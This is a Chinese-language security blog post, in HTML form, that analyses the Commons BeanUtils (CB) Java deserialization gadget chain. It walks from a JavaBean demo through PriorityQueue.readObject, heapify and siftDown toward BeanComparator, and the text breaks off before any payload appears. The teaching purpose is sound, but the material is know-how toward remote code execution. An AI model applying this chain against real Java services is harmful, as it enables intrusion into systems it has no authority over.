@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="CB通常指的是 **Apache Commons BeanUtils** 这个库。它是Apache Commons项目中的一个子组件，提供了对常规JavaBean进行便捷操作的API，例如动态获取&#x2F;设置属性、复制属性等。在安全上下文中，我们谈论的“CB中的JavaBean利用”主要是指利用 **Commons BeanUtils** 库中的特定类，将其作为反序列化利用链（Gadget Chain）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化之CB链分析">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/09/30/Java%E6%94%BB%E9%98%B2/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="CB通常指的是 **Apache Commons BeanUtils** 这个库。它是Apache Commons项目中的一个子组件，提供了对常规JavaBean进行便捷操作的API，例如动态获取&#x2F;设置属性、复制属性等。在安全上下文中，我们谈论的“CB中的JavaBean利用”主要是指利用 **Commons BeanUtils** 库中的特定类，将其作为反序列化利用链（Gadget Chain）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250929131425163.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250929144401826.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250929145921335.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250929150446137.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250929151110886.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250929164033907.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250929160041377.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250929160157716.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250929160301393.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250929162847375.png">
+<meta property="article:published_time" content="2025-09-29T16:02:05.000Z">
+<meta property="article:modified_time" content="2025-09-29T16:05:52.675Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/image-20250929131425163.png">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/09/30/Java%E6%94%BB%E9%98%B2/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB%E9%93%BE%E5%88%86%E6%9E%90/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/09/30/Java%E6%94%BB%E9%98%B2/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB%E9%93%BE%E5%88%86%E6%9E%90/","path":"2025/09/30/Java攻防/反序列化之CB链分析/","title":"反序列化之CB链分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>反序列化之CB链分析 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"cdn":"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB%E9%93%BE"><span class="nav-number">1.</span> <span class="nav-text">反序列化之CB链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CB%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3"><span class="nav-number">2.</span> <span class="nav-text">CB简单了解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaBean-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">3.</span> <span class="nav-text">JavaBean 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%EF%BC%9A-%E4%B8%80%E4%B8%AA%E7%AC%A6%E5%90%88%E7%89%B9%E5%AE%9A%E8%A7%84%E8%8C%83%E7%9A%84Java%E7%B1%BB%E3%80%82"><span class="nav-number">3.1.</span> <span class="nav-text">定义： 一个符合特定规范的Java类。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%84%E5%88%99"><span class="nav-number">3.2.</span> <span class="nav-text">规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Commons-BeanUtils-%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E4%B8%8E%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3"><span class="nav-number">3.3.</span> <span class="nav-text">Commons BeanUtils 的核心功能与安全隐患</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%BC%94%E7%A4%BA"><span class="nav-number">3.4.</span> <span class="nav-text">代码演示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CB%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">CB链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">4.1.</span> <span class="nav-text">流程图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-PriorityQueue%E7%B1%BB"><span class="nav-number">4.2.</span> <span class="nav-text">1. PriorityQueue类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-JavaBean"><span class="nav-number">4.3.</span> <span class="nav-text">2. JavaBean</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-TemplatesImpl%E7%B1%BB"><span class="nav-number">4.4.</span> <span class="nav-text">3. TemplatesImpl类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="nav-number">4.5.</span> <span class="nav-text">弹出计算器</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/09/30/Java%E6%94%BB%E9%98%B2/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB%E9%93%BE%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="反序列化之CB链分析 | 子非鱼的博客">
+      <meta itemprop="description" content="CB通常指的是 **Apache Commons BeanUtils** 这个库。它是Apache Commons项目中的一个子组件，提供了对常规JavaBean进行便捷操作的API，例如动态获取&#x2F;设置属性、复制属性等。在安全上下文中，我们谈论的“CB中的JavaBean利用”主要是指利用 **Commons BeanUtils** 库中的特定类，将其作为反序列化利用链（Gadget Chain）中的关键一环，最终实现远程代码执行（RCE）。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          反序列化之CB链分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-09-30 00:02:05 / 修改时间：00:05:52" itemprop="dateCreated datePublished" datetime="2025-09-30T00:02:05+08:00">2025-09-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Java攻防</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">CB通常指的是 **Apache Commons BeanUtils** 这个库。它是Apache Commons项目中的一个子组件，提供了对常规JavaBean进行便捷操作的API，例如动态获取/设置属性、复制属性等。在安全上下文中，我们谈论的“CB中的JavaBean利用”主要是指利用 **Commons BeanUtils** 库中的特定类，将其作为反序列化利用链（Gadget Chain）中的关键一环，最终实现远程代码执行（RCE）。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="反序列化之CB链">反序列化之CB链</h2>
+<p>文章推荐:</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BktplS5xLw3OnOJxvRp2RQ">https://mp.weixin.qq.com/s/BktplS5xLw3OnOJxvRp2RQ</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/319397.html">https://www.freebuf.com/articles/web/319397.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/t13Hd33Rak3IjmdtUQXMkQ">https://mp.weixin.qq.com/s/t13Hd33Rak3IjmdtUQXMkQ</a></p>
+<h2 id="CB简单了解">CB简单了解</h2>
+<p><code>CB</code>: 通常指的是 <strong>Apache Commons BeanUtils</strong> 这个库。它是Apache Commons项目中的一个子组件，提供了对常规JavaBean进行便捷操作的API，例如动态获取/设置属性、复制属性等。</p>
+<p>在安全上下文中，我们谈论的“CB中的JavaBean利用”主要是指利用 <strong>Commons BeanUtils</strong> 库中的特定类，将其作为反序列化利用链（Gadget Chain）中的关键一环，最终实现远程代码执行（RCE）。</p>
+<h2 id="JavaBean-基础知识">JavaBean 基础知识</h2>
+<h3 id="定义：-一个符合特定规范的Java类。"><strong>定义</strong>： 一个符合特定规范的Java类。</h3>
+<h3 id="规则"><strong>规则</strong></h3>
+<ul>
+<li>必须有一个无参公共构造函数。</li>
+<li>属性是私有的。</li>
+<li>通过公共的getter（<code>getPropertyName</code>）和setter（<code>setPropertyName</code>）方法来访问和修改属性。</li>
+</ul>
+<h3 id="Commons-BeanUtils-的核心功能与安全隐患"><strong>Commons BeanUtils 的核心功能与安全隐患</strong></h3>
+<p>BeanUtils的核心魅力在于它可以<strong>通过属性名的字符串形式来动态操作JavaBean</strong>。</p>
+<ul>
+<li><code>BeanUtils.getProperty(myBean, &quot;name&quot;)</code>： 相当于调用 <code>myBean.getName()</code></li>
+<li><code>BeanUtils.setProperty(myBean, &quot;age&quot;, &quot;25&quot;)</code>： 相当于调用 <code>myBean.setAge(25)</code></li>
+</ul>
+<p><strong>安全隐患就源于这种“动态性”</strong>。攻击者可以构造一个特殊的序列化数据，当被反序列化时，会触发BeanUtils去调用一个精心设计的getter或setter方法，而这个方法的功能远不止简单地返回或设置一个属性值。</p>
+<h3 id="代码演示">代码演示</h3>
+<p>准备一个User类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CB1_chain;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(<span class="type">int</span> id, String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getId&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setId&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后再pom.xml中添加</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后测试javabean</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CB1_chain;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>,<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>),<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果:</p>
+<blockquote>
+<p>有参构造<br>
+getName</p>
+</blockquote>
+<p>在javabean中添加</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>,<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>),<span class="string">&quot;age&quot;</span>);</span><br><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>,<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>),<span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>再次运行,输出</p>
+<blockquote>
+<p>有参构造<br>
+getName<br>
+有参构造<br>
+getAge<br>
+有参构造<br>
+getId</p>
+</blockquote>
+<p>所以可以看到PropertyUtils.getProperty调用了<code>User.getName,User.getAge,User.getId</code>方法</p>
+<p>所以但我们在代码中尝试</p>
+<p><code>PropertyUtils.getProperty(new TemplatesImpl() ,&quot;outputProperty&quot;);</code></p>
+<p>就会执行<code>TemplatesImpl.getOutputProperty</code></p>
+<p>基于此,引出它的链</p>
+<h2 id="CB链分析">CB链分析</h2>
+<h3 id="流程图">流程图</h3>
+<p><img src="/images/image-20250929131425163.png" alt="image-20250929131425163"></p>
+<p><img src="/images/image-20250929144401826.png" alt="image-20250929144401826"></p>
+<p>两张图一个效果</p>
+<h3 id="1-PriorityQueue类">1. PriorityQueue类</h3>
+<p>根据图片CB链的调用,先查看PriorityQueue类</p>
+<p>导入<code>import org.apache.commons.beanutils.PropertyUtils;</code>,导入后<code>new PriorityQueue().add(1);</code>,然后CTRL+鼠标左键进入PropertyUtils类,</p>
+<p>这个类是jdk自带的类</p>
+<p>这个类有一个readObject()方法</p>
+<p><img src="/images/image-20250929145921335.png" alt="image-20250929145921335"></p>
+<p>方法中有heapify()的调用,查看heapify()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var1</span> <span class="operator">=</span> (<span class="built_in">this</span>.size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; var1 &gt;= <span class="number">0</span>; --var1) &#123;</span><br><span class="line">            <span class="built_in">this</span>.siftDown(var1, <span class="built_in">this</span>.queue[var1]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>方法中<code>this.size &gt;&gt;&gt; 1</code>满足的话,就会调用<code>siftDown</code>,要满足this.size &gt;&gt;&gt; 1,size需要&gt;=2.</p>
+<p>查看siftDown方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> var1, E var2)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="built_in">this</span>.comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="built_in">this</span>.siftDownUsingComparator(var1, var2);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="built_in">this</span>.siftDownComparable(var1, var2);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>然后满足<code>this.comparator != null</code>,就会调用<code>siftDownUsingComparator</code>,</p>
+<p>查看<code>siftDownUsingComparator</code></p>
+<p><img src="/images/image-20250929150446137.png" alt="image-20250929150446137"></p>
+<p>这个方法的<code>var6 &lt; this.size &amp;&amp; this.comparator.compare(var5, this.queue[var6]) &gt; 0</code>这一句里判断条件里,执行了<code>comparator.compare</code></p>
+<h3 id="2-JavaBean">2. JavaBean</h3>
+<p>查看compare(),点进去是个借口,查看他的实现</p>
+<p><img src="/images/image-20250929151110886.png" alt="image-20250929151110886"></p>
+<p>org.apache.commons.beanutils,这个类是commons.beanutils依赖中的类了</p>
+<p>查看<code>compare</code>方法</p>
